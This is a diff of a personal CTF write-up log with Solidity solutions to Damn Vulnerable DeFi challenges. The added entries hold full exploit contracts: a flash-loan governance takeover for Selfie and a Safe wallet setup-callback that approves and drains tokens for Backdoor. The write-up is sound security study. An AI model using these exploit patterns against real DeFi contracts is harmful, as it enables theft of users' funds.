@@ -34,7 +34,7 @@ If `convertToShares(totalSupply) != totalAssets()` revert then the problem will 
 Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.
 
 Solve:
-```solidity=
+```solidity
     function test_unstoppable() public checkSolvedByPlayer {
         token.transfer(address(vault), 10);
     }
@@ -46,7 +46,7 @@ Solve:
 Issue:
 
 The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
-```solidity=
+```solidity
     function transferFrom(
         address from,
         address to,
@@ -70,7 +70,7 @@ The issue algin with the challenge is that, the share update in `transferFrom` f
 ```
 
 Solve:
-```solidity=
+```solidity
     function solve() external {
         // Claim 1000 GREY
         setup.claim();
@@ -103,10 +103,10 @@ Solve:
 #### Truster
 Issue:
 
-The issue for this flash loan contract is the usage of `functionCall`, which allows the attacker to perform function calls under the flash loan contract's context.
+The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.
 
 Solve:
-```solidity=
+```solidity
     function test_truster() public checkSolvedByPlayer {
         test t = new test();
 
@@ -126,11 +126,11 @@ Solve:
 #### SideEntrance
 Issue: 
 
-The main idea for this program is to utilize the deposit function while using a flash loan, which will manipulate the balance and also fulfill the balance requirement to complete the flash loan.
+The main idea for this program is utilize the the deposit function while flashloan which will manipulate the balance and also fulfill the balance requirement to complete the flashloan.
 
 Solve:
 
-```solidity=
+```solidity
 function test_sideEntrance() public checkSolvedByPlayer {
     Exploit exp = new Exploit(address(pool), recovery);
     exp.attack(address(pool).balance);
@@ -154,6 +154,178 @@ contract Exploit{
     }
     receive () external payable {}
 
+}
+```
+
+### 2024.08.31
+
+- Damn Vulnerable DeFi: Selfie
+
+#### Selfie
+Issue:
+
+I feel the biggest issue is that the pool is providing the governance token via flashloan, as long as the token exceed half of the supply, the proposal can be passed.
+
+```solidity
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _votingToken.getVotes(who);
+        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
+        return balance > halfTotalSupply;
+    }
+```
+
+Solve:
+```solidity
+    function test_selfie() public checkSolvedByPlayer {
+        SelfiePoolExploit spe = new SelfiePoolExploit(
+            pool,
+            governance,
+            token,
+            recovery
+        );
+
+        spe.attack();
+
+        vm.warp(block.timestamp + 2 days);
+        spe.executeAction();
+
+    }
+
+```
+
+```solidity
+contract SelfiePoolExploit {
+    SelfiePool pool;
+    SimpleGovernance governance;
+    DamnValuableVotes votes;
+    uint256 public actionId;
+    address owner;
+    address recovery;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _vote, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        votes = _vote;
+        owner = msg.sender;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        // init flashloan
+        uint256 amount = pool.token().balanceOf(address(pool));
+        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), amount, data);
+    }
+
+    function onFlashLoan(
+        address _initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+
+        votes.delegate(address(this));
+
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            data
+        );
+        actionId = _actionId;
+
+        IERC20(token).approve(address(pool), amount + fee);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function executeAction() external {
+        // Execute the malicious auction
+        governance.executeAction(actionId);
+    }
+}
+```
+
+
+### 2024.09.01
+
+- Damn Vulnerable DeFi: Backdoor
+
+#### Backdoor
+
+Solve:
+
+```solidity
+    function test_backdoor() public checkSolvedByPlayer {
+        BackdoorAttacker ba = new BackdoorAttacker(recovery, token);
+        ba.attack(
+            address(walletFactory),
+            address(singletonCopy), 
+            address(walletRegistry), 
+            users
+        );
+
+    }
+```
+
+```solidity
+interface ISafe {
+    function setup(
+        address[] calldata _owners,
+        uint256 _threshold,
+        address to,
+        bytes calldata data,
+        address fallbackHandler,
+        address paymentToken,
+        uint256 payment,
+        address payable paymentReceiver
+    ) external;
+}
+import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
+
+contract Approve {
+  function approve(DamnValuableToken token, address spender) external {
+      token.approve(spender, type(uint256).max);
+    }
+}
+
+contract BackdoorAttacker {
+  address recovery;
+  DamnValuableToken token;
+  Approve mApprove;
+
+  constructor(address _recovery, DamnValuableToken _token) {
+    recovery = _recovery;
+    token = _token;
+  }
+
+  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
+    mApprove = new Approve();
+    for (uint256 i = 0; i < 4; i++) {
+            address[] memory users = new address[](1);
+            users[0] = _users[i];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                users,
+                1,
+                mApprove,
+                abi.encodeWithSelector(Approve.approve.selector, token, address(this)),
+                address(0x0),
+                address(0x0),
+                0,
+                address(0x0)
+            );
+
+            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
+                _singletonCopy,
+                initializer,
+                i,
+                IProxyCreationCallback(_walletRegistry)
+            );
+
+            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
+        }
+    }  
 }
 ```
 
